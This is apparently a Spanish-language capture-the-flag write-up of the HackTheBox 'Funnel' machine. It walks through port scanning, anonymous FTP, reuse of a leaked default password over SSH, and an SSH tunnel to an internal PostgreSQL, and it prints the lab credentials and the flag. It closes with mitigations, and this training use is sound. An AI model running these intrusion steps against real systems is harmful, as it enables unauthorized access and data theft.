---
layout: post
title: HTB — Funnel
date: 2026-04-26
platform: HackTheBox
difficulty: very-easy
description: Credenciales expuestas en FTP + PostgreSQL interno accesible via port forwarding
tags:
  - PostgresSQL
  - Linux
---

## Introducción

Funnel introduce dos conceptos nuevos: encontrar credenciales en archivos expuestos vía FTP y el **SSH local port forwarding** — la técnica de crear un túnel SSH para acceder a servicios que solo están disponibles internamente en el servidor. PostgreSQL corre en localhost y no es visible desde fuera, pero una vez dentro del sistema podemos exponerlo a nuestra máquina.

---

## Reconocimiento

Verificamos conectividad:

```bash
ping -c 1 10.129.x.x
# -c 1    Envía solo 1 paquete ICMP
```

Descubrimiento de puertos:

```bash
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.129.x.x -oG allports
# -p-          Escanea los 65535 puertos
# -sS          SYN scan (sigiloso, no completa el handshake TCP)
# --open       Muestra solo puertos abiertos
# --min-rate   Envía mínimo 5000 paquetes por segundo
# -vvv         Verbose: muestra resultados en tiempo real
# -n           Sin resolución DNS (más rápido)
# -Pn          Omite el host discovery (asume que el host está activo)
# -oG          Guarda el output en formato Grepable
```

Output relevante:

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
```

Escaneo de versiones y scripts:

```bash
nmap -sCV -p21,22 10.129.x.x -oN target
# -sC       Ejecuta scripts de detección por defecto (NSE)
# -sV       Detecta versión del servicio
# -p21,22   Escanea solo los puertos especificados
# -oN       Guarda el output en formato Normal (legible)
```

Output relevante:

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed
22/tcp open  ssh     OpenSSH 8.2p1
```

---

## Enumeración FTP

Me conecto con usuario anónimo:

```bash
ftp 10.129.x.x
# Usuario: anonymous
# Contraseña: (enter)
```

Listo y descargo los archivos disponibles:

```bash
ftp> ls -la
# mail_backup/

ftp> cd mail_backup
ftp> ls
# password_policy.pdf
# welcome_28112022

ftp> get password_policy.pdf
ftp> get welcome_28112022
# get    Descarga el archivo al directorio local
```

El archivo `welcome_28112022` contiene un correo de bienvenida con credenciales iniciales para nuevos empleados. La contraseña por defecto mencionada es `funnel123#!`.

Los usuarios mencionados incluyen a `christine`.

---

## Acceso SSH

Pruebo las credenciales encontradas:

```bash
ssh christine@10.129.x.x
# Contraseña: funnel123#!
```

```
christine@funnel:~$
```

Acceso SSH como christine.

---

## Enumeración interna — Port Forwarding

Enumero los puertos internos del servidor:

```bash
ss -tlnp
# -t    Solo TCP
# -l    Solo los que están escuchando
# -n    Muestra números en lugar de nombres
# -p    Muestra el proceso asociado
```

Output relevante:

```
LISTEN  0.0.0.0:22     → SSH (conocido)
LISTEN  *:21           → FTP (conocido)
LISTEN  127.0.0.1:5432 → PostgreSQL (solo interno)
```

Puerto **5432** escuchando solo en localhost — PostgreSQL no visible desde afuera. Creo un túnel SSH para exponer ese puerto a mi Kali:

```bash
ssh -L 1234:localhost:5432 christine@10.129.x.x
# -L              Local port forwarding
# 1234            Puerto local en mi Kali
# localhost:5432  Puerto interno del servidor
# christine@IP    Credenciales SSH para el túnel
```

---

## Explotación — PostgreSQL

Con el túnel activo, me conecto a PostgreSQL desde mi Kali:

```bash
psql -h localhost -p 1234 -U christine
# -h    Host (mi propia máquina, el túnel hace el resto)
# -p    Puerto local del túnel
# -U    Usuario de PostgreSQL
```

```
christine=#
```

Enumero las bases de datos:

```sql
\l
```

```
secrets
```

Me muevo a la base de datos relevante y busco la flag:

```sql
\c secrets
\dt
SELECT * FROM flag;
```

```
cf277664b1771217d7006acdea006db1
```

---

## ¿Qué aprendemos de esto?

**Las credenciales en archivos de bienvenida son un riesgo real.** Correos de onboarding con contraseñas iniciales en texto plano, accesibles vía FTP anónimo, son una combinación peligrosa. Las contraseñas iniciales deben ser temporales y expirar al primer login.

**SSH port forwarding es una técnica fundamental.** Servicios internos que no son accesibles desde fuera pueden exponerse a través de un túnel SSH. Es una técnica legítima de administración que también es un vector de ataque potente en pentesting.

**PostgreSQL en localhost no significa seguro.** Si un atacante obtiene acceso al sistema, puede exponer cualquier servicio interno. La defensa en profundidad requiere autenticación fuerte en la base de datos independientemente de dónde esté escuchando.

---

## Resumen técnico

| Elemento | Detalle |
|----------|---------|
| Puertos externos | 21/tcp (FTP), 22/tcp (SSH) |
| Puerto interno | 5432/tcp (PostgreSQL — solo localhost) |
| Vulnerabilidad | Credenciales expuestas en FTP + PostgreSQL accesible via port forwarding |
| Credenciales | `christine / funnel123#!` (encontradas en FTP) |
| Acceso obtenido | SSH como christine + lectura de PostgreSQL |
| Herramientas | `nmap`, `ftp`, `ssh`, `ss`, `psql` |
| Mitigación | Deshabilitar FTP anónimo, nunca almacenar credenciales en texto plano, requerir autenticación en PostgreSQL, forzar cambio de contraseña en primer login |
